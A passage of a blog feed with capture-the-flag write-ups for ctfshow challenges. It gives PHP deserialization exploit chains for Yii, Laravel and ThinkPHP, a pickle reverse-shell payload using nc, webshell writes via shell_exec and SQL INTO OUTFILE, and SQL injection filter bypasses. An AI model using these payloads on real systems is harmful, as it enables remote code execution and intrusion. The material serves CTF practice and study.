}\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n\n?&gt;\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwczovL21wLndlaXhpbi5xcS5jb20vcz9fX2Jpej1NelU1TURJME9ESTVNUT09Jm1pZD0yMjQ3NDg1MTI5JmlkeD0xJnNuPWIyN2UzZmU4NDVkYWVlMmZiMTNiYjlmMzZmNTNhYjQw\">复现文章2</span></p>\n<h1 id=\"web-268\"><a href=\"#web-268\" class=\"headerlink\" title=\"web 268\"></a>web 268</h1><pre><code class=\"php\">&lt;?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'phpinfo';\n            $this-&gt;id = '1';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            // 这里需要改为 isRunning\n            $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\n// poc2\nnamespace Codeception\\Extension{\n    use Faker\\Generator;\n    class RunProcess{\n        private $processes;\n        public function __construct()\n        {\n            $this-&gt;processes = [new Generator()];\n        }\n    }\n}\nnamespace{\n    // 生成 poc\n    echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));\n}\n?&gt;\n</code></pre>\n<h1 id=\"web-269\"><a href=\"#web-269\" class=\"headerlink\" title=\"web 269\"></a>web 269</h1><pre><code class=\"php\">&lt;?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'phpinfo';\n            $this-&gt;id = '1';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            // 这里需要改为 isRunning\n            $this-&gt;formatters['render'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace phpDocumentor\\Reflection\\DocBlock\\Tags{\n\n    use Faker\\Generator;\n\n    class See{\n        protected $description;\n        public function __construct()\n        {\n            $this-&gt;description = new Generator();\n        }\n    }\n}\nnamespace{\n    use phpDocumentor\\Reflection\\DocBlock\\Tags\\See;\n    class Swift_KeyCache_DiskKeyCache{\n        private $keys = [];\n        private $path;\n        public function __construct()\n        {\n            $this-&gt;path = new See;\n            $this-&gt;keys = array(\n                \"axin\"=&gt;array(\"is\"=&gt;\"handsome\")\n            );\n        }\n    }\n    // 生成 poc\n    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));\n}\n?&gt;\n</code></pre>\n<h1 id=\"web-270\"><a href=\"#web-270\" class=\"headerlink\" title=\"web 270\"></a>web 270</h1><p>也可以反弹shell</p>\n<p><code>$exp = new \\yii\\db\\BatchQueryResult('shell_exec', \"nc xx.xx.xx.xx port -e /bin/sh\");</code></p>\n<pre><code class=\"php\">&lt;?php\nnamespace yii\\rest {\n    class Action\n    {\n        public $checkAccess;\n    }\n    class IndexAction\n    {\n        public function __construct($func, $param)\n        {\n            $this-&gt;checkAccess = $func;\n            $this-&gt;id = $param;\n        }\n    }\n}\nnamespace yii\\web {\n    abstract class MultiFieldSession\n    {\n        public $writeCallback;\n    }\n    class DbSession extends MultiFieldSession\n    {\n        public function __construct($func, $param)\n        {\n            $this-&gt;writeCallback = [new \\yii\\rest\\IndexAction($func, $param), \"run\"];\n        }\n    }\n}\nnamespace yii\\db {\n    use yii\\base\\BaseObject;\n    class BatchQueryResult\n    {\n        private $_dataReader;\n        public function __construct($func, $param)\n        {\n            $this-&gt;_dataReader = new \\yii\\web\\DbSession($func, $param);\n        }\n    }\n}\nnamespace {\n    $exp = new \\yii\\db\\BatchQueryResult('shell_exec', \"echo '&lt;?php eval(\\$_POST[1]); ?&gt;' &gt; 1.php\");\n    echo(base64_encode(serialize($exp)));\n}\n</code></pre>\n<h1 id=\"web-271\"><a href=\"#web-271\" class=\"headerlink\" title=\"web 271\"></a>web 271</h1><p>laravel5.7 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\n\nnamespace Illuminate\\Foundation\\Testing {\n    class PendingCommand\n    {\n        public $test;\n        protected $app;\n        protected $command;\n        protected $parameters;\n\n        public function __construct($test, $app, $command, $parameters)\n        {\n            $this-&gt;test = $test;                 // 一个实例化的类 Illuminate\\Auth\\GenericUser\n            $this-&gt;app = $app;                   // 一个实例化的类 Illuminate\\Foundation\\Application\n            $this-&gt;command = $command;           // 要执行的 php 函数 system\n            $this-&gt;parameters = $parameters;     // 要执行的 php 函数的参数  array ('id')\n        }\n    }\n}\n\nnamespace Faker {\n    class DefaultGenerator\n    {\n        protected $default;\n\n        public function __construct($default = null)\n        {\n            $this-&gt;default = $default;\n        }\n    }\n}\n\nnamespace Illuminate\\Foundation {\n    class Application\n    {\n        protected $instances = [];\n\n        public function __construct($instances = [])\n        {\n            $this-&gt;instances['Illuminate\\Contracts\\Console\\Kernel'] = $instances;\n        }\n    }\n}\n\nnamespace {\n    $defaultgenerator = new Faker\\DefaultGenerator(array(\"hello\" =&gt; \"world\"));\n\n    $app = new Illuminate\\Foundation\\Application();\n\n    $application = new Illuminate\\Foundation\\Application($app);\n\n    $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, 'system', array('whoami'));\n\n    echo urlencode(serialize($pendingcommand));\n}\n</code></pre>\n<h1 id=\"web-272、273\"><a href=\"#web-272、273\" class=\"headerlink\" title=\"web 272、273\"></a>web 272、273</h1><p>laravel5.8 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\n/*\nAuthor:monitor\ndescription:\n    laravel deserialization chain\n*/\nnamespace Illuminate\\Broadcasting\n{\n    class PendingBroadcast{\n        protected $events;\n        protected $event;\n        public function __construct($events,$event)\n        {\n            $this-&gt;events = $events;\n            $this-&gt;event = $event;\n        }\n    }\n}\n\nnamespace Illuminate\\Bus\n{\n    class Dispatcher{\n        protected $queueResolver;\n        public function __construct($queueResolver)\n        {\n            $this-&gt;queueResolver = $queueResolver;\n        }\n    }\n}\n\nnamespace Mockery\\Loader\n{\n    class EvalLoader{\n\n    }\n}\n\nnamespace Mockery\\Generator\n{\n    class MockDefinition{\n        protected $config;\n        protected $code;\n        public function __construct($config,$code){\n            $this-&gt;config = $config;\n            $this-&gt;code = $code;\n        }\n    }\n    class MockConfiguration{\n        protected $name;\n        public function __construct($name)\n        {\n            $this-&gt;name = $name;\n        }\n    }\n}\n\nnamespace Illuminate\\Queue\n{\n    class CallQueuedClosure{\n        public $connection;\n        public function __construct($connection)\n        {\n            $this-&gt;connection = $connection;\n        }\n    }\n}\n\nnamespace\n{   \n    if($argc&lt;2){\n        echo \"Description:\\n\\tUse laravel deserialization to eval php code,don't need to input php tags.\";\n        echo \"\\nUsage:\" .$argv[0] . \" &lt;code&gt;\";\n        exit();\n    }\n    $code = $argv[1];\n    $mockconfiguration = new Mockery\\Generator\\MockConfiguration(\"pass\");\n    $mockdefination = new Mockery\\Generator\\MockDefinition($mockconfiguration,\"&lt;?php \".$code.\" exit;?&gt;\");\n    $callqueuedclosure = new Illuminate\\Queue\\CallQueuedClosure($mockdefination);\n    $evaload = new Mockery\\Loader\\EvalLoader();\n    $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evaload,\"load\"));\n    $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$callqueuedclosure);\n    echo urlencode(serialize($pendingbroadcast));\n}\n</code></pre>\n<p>xxxxxxxxxx&nbsp;0;alter table ctfshow_user change <code>username</code> <code>pass2</code> varchar(100);alter table ctfshow_user change <code>pass</code> <code>username</code> varchar(100);alter table ctfshow_user change <code>pass2</code> <code>pass</code> varchar(100);sql</p>\n<h1 id=\"web-274\"><a href=\"#web-274\" class=\"headerlink\" title=\"web 274\"></a>web 274</h1><p>thinkphp 5.1 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\nnamespace think;\nabstract class Model{\n    protected $append = [];\n    private $data = [];\n    function __construct(){\n        $this-&gt;append = [\"lin\"=&gt;[\"calc.exe\",\"calc\"]];\n        $this-&gt;data = [\"lin\"=&gt;new Request()];\n    }\n}\nclass Request\n{\n    protected $hook = [];\n    protected $filter = \"system\";\n    protected $config = [\n        // 表单 ajax 伪装变量\n        'var_ajax'         =&gt; '_ajax',  \n    ];\n    function __construct(){\n        $this-&gt;filter = \"system\";\n        $this-&gt;config = [\"var_ajax\"=&gt;'lin'];\n        $this-&gt;hook = [\"visible\"=&gt;[$this,\"isAjax\"]];\n    }\n}\n\n\nnamespace think\\process\\pipes;\n\nuse think\\model\\concern\\Conversion;\nuse think\\model\\Pivot;\nclass Windows\n{\n    private $files = [];\n\n    public function __construct()\n    {\n        $this-&gt;files=[new Pivot()];\n    }\n}\nnamespace think\\model;\n\nuse think\\Model;\n\nclass Pivot extends Model\n{\n}\nuse think\\process\\pipes\\Windows;\necho base64_encode(serialize(new Windows()));\n?&gt;\n</code></pre>\n<p><code>$lin</code> GET 赋值</p>\n<h1 id=\"web-275\"><a href=\"#web-275\" class=\"headerlink\" title=\"web 275\"></a>web 275</h1><p><code>__destruct</code>当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要<code>$this-&gt;evilfile</code>是<code>true</code>就可以执行系统命令了。最后再拼接一下命令<br>payload</p>\n<pre><code class=\"php\">?fn=;cat f*\ndata: flag=123\n</code></pre>\n<h1 id=\"web-276\"><a href=\"#web-276\" class=\"headerlink\" title=\"web 276\"></a>web 276</h1><p>在上个题的基础上增了了判断<code>$this-&gt;admin</code>所以真的需要我们去通过反序列化修改<code>admin</code>的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br>因为题目中有写文件的函数，所以可以通过<code>file_put_contents</code>写<code>phar</code>文件，然后再通过<code>file_put_contents</code>触发<code>phar</code>反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br>生成<code>phar</code>文件</p>\n<pre><code class=\"php\">&lt;?php\n\nclass filter{\n    public $filename = \"1|cat f*\";\n    public $filecontent;\n    public $evilfile = true;\n    public $admin = true;\n}\n\n$phar = new Phar(\"phar.phar\");\n$phar-&gt;startBuffering();\n$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");\n\n$o = new filter();\n$phar-&gt;setMetadata($o);\n$phar-&gt;addFromString(\"test.txt\", \"test\");\n$phar-&gt;stopBuffering();\n</code></pre>\n<p>条件竞争</p>\n<pre><code class=\"python\">import requests\nimport threading\nimport base64\nurl = 'http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/'\n\nf = open('./phar.phar', 'rb')\n\ndata = f.read()\nflag = False\n\ndef work1():\n    requests.post(url+\"?fn=a\", data=data)\n\n\ndef work2():\n    global flag\n    r = requests.post(url+\"?fn=phar://phar.phar/\", data=\"\")\n    if \"flag{\" in r.text and flag is False:\n        print(base64.b64encode(r.text.encode()))\n        flag = True\n\nwhile flag is False:\n    a = threading.Thread(target=work1)\n    b = threading.Thread(target=work2)\n    a.start()\n    b.start()\n</code></pre>\n<h1 id=\"web-277-278\"><a href=\"#web-277-278\" class=\"headerlink\" title=\"web 277 278\"></a>web 277 278</h1><pre><code class=\"python\">import pickle\nimport base64\nclass A(object):\n    def __reduce__(self):\n        return(eval,('__import__(\"os\").popen(\"nc xxx.xxx.xxx.xxx 4567 -e /bin/sh\").read()',))\na=A()\ntest=pickle.dumps(a)\nprint(base64.b64encode(test))\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/35cb7ca5/",
            "url": "http://dpm12345.cn/posts/35cb7ca5/",
            "title": "SQL 注入",
            "date_published": "2022-10-04T14:15:40.000Z",
            "content_html": "<ul>\n<li>\n<p>若对返回值进行过滤</p>\n<ul>\n<li>\n<p>可以在该字段名前加上 <code>hex()</code>  十六进制编码</p>\n</li>\n<li>\n<p>使用 replace 函数，对返回结果进行替换，绕过 waf，得到替换结果后再替换回来</p>\n</li>\n</ul>\n</li>\n<li>\n<p>sql 注入也可以将内容写入到外部文件中，</p>\n<p>如 <code>select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile '/var/www/html/1.php'</code></p>\n<p>为了防止失败，可对 php 语句进行编码 <code>(base64+url)</code></p>\n<p>之后访问 1.php，可以发现成功，然后使用蚁剑连接，进行数据操作，然后新建数据库 (信息在根目录下 <code>api</code>  下的 <code>config.php</code>  文件中)</p>\n<p>之后找到 flag</p>\n</li>\n<li>\n<p>如果过滤 sql 语句中的某个值，如 <code>username=flag</code> ，而 flag 被过滤，那么可以使用 <code>like+通配符</code> 的方法，如 <code>like '%fla%'</code></p>\n<p>其中 <code>%</code>  匹配任意个字符， <code>_</code> 匹配一个字符，同样也可以使用十六进制编码</p>\n<p>如 <code>select id,username,password from users where username=0x666c6167;</code>  也是可以的，查询出 <code>username='flag'</code>  的情况</p>\n<p>或者用 <code>base64</code>  编码</p>\n</li>\n<li>\n<p>where 被过滤可以使用 having，同 where 用法</p>\n</li>\n<li>\n<p>若 ban 了数字，那么可以使用 <code>true，false</code>  来代替 <code>1 和 0</code> ，然后利用加法构建任意数字，接着利用 <code>concat</code>  函数拼接字符串，从而生成无数字的语句的 (但实际上包含语句)，如</p>\n<p><code>select username,password from users where id=concat(true,true);</code></p>\n<p>等价于 <code>select username,password from users where id='11';</code></p>\n</li>\n<li>\n<p>对于 select 的查询语句</p>\n<p><code>select count(*) from users where username='8' or 'a23';</code></p>\n<p>返回结果是 0</p>\n<p><code>select count(*) from users where username='8' or '1a';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '1';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '0';</code></p>\n<p>返回结果是 0</p>\n<p>那么也就是说，在 or 语句中，0，字母开头的为非，数字开头的为正</p>\n<p>可利用该特性进行 SQL 注入</p>\n</li>\n<li>\n<p>sql 语句的查询机制</p>\n</li>\n<li>\n<p>如 sql 语句 <code>select username,password from users where username='flag';</code></p>\n<p>它将会返回 <code>username</code>  为 <code>flag</code>  的值的数据</p>\n<p>但如果此时将 <code>username='flag'</code>  换为 <code>username=0</code>  后，是否还能查到 flag 呢？</p>\n<p>答案是肯定的，这是因为，这里的等于是弱等于，</p>\n</li>\n<li>\n<p>substr 如果被禁了，可以使用 left 代替，其中 left 只有两个参数，第一个为字符串，第二个为个数，即从最左端开始</p>\n<p>如 <code>select left(\"abc\",2);</code>  返回 <code>ab</code></p>\n<p>或者也可以使用 <code>lpad</code> ，其有三个参数</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>LPAD<span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span>len<span class=\"token punctuation\">,</span>padstr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">Returns</span> the string str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">left</span><span class=\"token operator\">-</span>padded <span class=\"token keyword\">with</span> the string padstr <span class=\"token keyword\">to</span> a length <span class=\"token keyword\">of</span> len characters<span class=\"token punctuation\">.</span> <span class=\"token keyword\">If</span> str <span class=\"token operator\">is</span> longer than len<span class=\"token punctuation\">,</span> the <span class=\"token keyword\">return</span> <span class=\"token keyword\">value</span> <span class=\"token operator\">is</span> shortened <span class=\"token keyword\">to</span> len characters<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mysql<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'??hi'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mysql<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'h'</span></pre></td></tr></tbody></table></figure><p>那么可以 <code>lpad(\"abc\",2,\"\");</code>  达到与 left 同样效果</p>\n</li>\n<li>\n<p>时间盲注</p>\n<p><strong>sleep(3)</strong> 直截了当的时间盲注</p>\n<p><strong>benchmark()</strong></p>\n<p>The BENCHMARK() function executes the expression expr repeatedly count times. It may be used to time how quickly MySQL processes the expression. The result value is 0, or NULL for inappropriate arguments such as a NULL or negative repeat count.</p>\n<p><strong>rlike</strong> 正则匹配</p>\n<p><strong>多次查询排序</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">&gt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>c<span class=\"token punctuation\">)</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure></li>\n</ul>\n<h1 id=\"web-171\"><a class=\"anchor\" href=\"#web-171\">#</a> web 171</h1>\n<p>根据查询语句</p>\n<p><code>$sql = \"select username,password from user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\";</code>  可知可用单引号闭合，然后利用 or 的特性</p>\n<p><code>0' or username='flag'%23</code></p>\n<p>查找到 flag</p>\n<h1 id=\"web-172\"><a class=\"anchor\" href=\"#web-172\">#</a> web 172</h1>\n<p>使用联合注入</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p><code>' union select 1,password from ctfshow_user2 where username ='flag'%23</code></p>\n<h1 id=\"web-173\"><a class=\"anchor\" href=\"#web-173\">#</a> web 173</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>同上题</p>\n<p><code>' union select 1,2,password from ctfshow_user3 where username ='flag'%23</code></p>\n<h1 id=\"web-174\"><a class=\"anchor\" href=\"#web-174\">#</a> web 174</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>这题使用 <code>replace</code>  函数对数字进行替换</p>\n<p>注意需要抓包，因为内容过长，正常提交不上去，同时 url 编码</p>\n<p><code>'%20union%20select%20'a'%2Creplace(replace(replace(replace(replace(replace(replace(replace(replace(replace((b.password)%2C'0'%2C'!')%2C'1'%2C'%23')%2C'2'%2C'%24')%2C'3'%2C'%25')%2C'4'%2C'%26')%2C'5'%2C'(')%2C'6'%2C')')%2C'7'%2C'*')%2C'8'%2C'%2B')%2C'9'%2C'%2C')%20from%20ctfshow_user4%20as%20b%20where%20b.username%3D'flag'%23</code></p>\n<h1 id=\"web-175\"><a class=\"anchor\" href=\"#web-175\">#</a> web 175</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[\\x00-\\x7f]/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>过滤了所有 ASCII 字符</p>\n<p>写文件</p>\n<p><code>'%20union%20select%201%2C%22%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%22%20into%20outfile%20%22%2Fvar%2Fwww%2Fhtml%2F1.php%22%23</code></p>\n<p>然后蚁剑连接，进入数据库，查询 flag  <code>select password from ctfshow_user5 where username='flag';</code></p>\n<h1 id=\"web-176\"><a class=\"anchor\" href=\"#web-176\">#</a> web 176</h1>\n<p><code>0' or username='flag'%23</code></p>\n<h1 id=\"web-177\"><a class=\"anchor\" href=\"#web-177\">#</a> web 177</h1>\n<p>过滤了空格</p>\n<p><code>0'/**/or/**/username='flag'%23</code></p>\n<h1 id=\"web-178\"><a class=\"anchor\" href=\"#web-178\">#</a> web 178</h1>\n<p>前面的空格绕过用不了，这里使用 <code>%0a</code>  和括号绕过</p>\n<p><code>0'union%0aselect'1','2',(select(password)from(ctfshow_user)where(username='flag'))%23</code></p>\n<p>或者仅仅用括号</p>\n<p><code>0'or(username='flag')%23</code></p>\n<h1 id=\"web-179\"><a class=\"anchor\" href=\"#web-179\">#</a> web 179</h1>\n<p>同上一题做法</p>\n<h1 id=\"web-180\"><a class=\"anchor\" href=\"#web-180\">#</a> web 180</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select id,username,password from ctfshow_user where username !='flag' and id = '\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"' limit 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"解法一\"><a class=\"anchor\" href=\"#解法一\">#</a> 解法一</h2>\n<p><code>0'union%0cselect'1','2',(select(password)from(ctfshow_user)where(username='flag'))'</code></p>\n<p>由于过滤了 <code>--+</code>  和 <code>#</code> ，只能使用闭合</p>\n<h2 id=\"解法二\"><a class=\"anchor\" href=\"#解法二\">#</a> 解法二</h2>\n<p><code>0'or(username='flag')and'2</code></p>\n<p>原理是运用了 sql 语句的判断优先级，与原查询语句组合后，得到 <code>select id,username,password from ctfshow_user where username !='flag' and id = 0'or(username='flag')and'2' limit 1;</code></p>\n<p><code>username!='flag' and id=0</code>  和 <code>username='flag' and '2'</code>  作为两个条件进行判断，因此可以返回结果</p>\n<h1 id=\"web-181\"><a class=\"anchor\" href=\"#web-181\">#</a> web 181</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>用上一题的解法二即可</p>\n<h1 id=\"web-182\"><a class=\"anchor\" href=\"#web-182\">#</a> web 182</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>过滤了 flag，前面的 <code>username='flag'</code>  用不了，这里可以使用正则 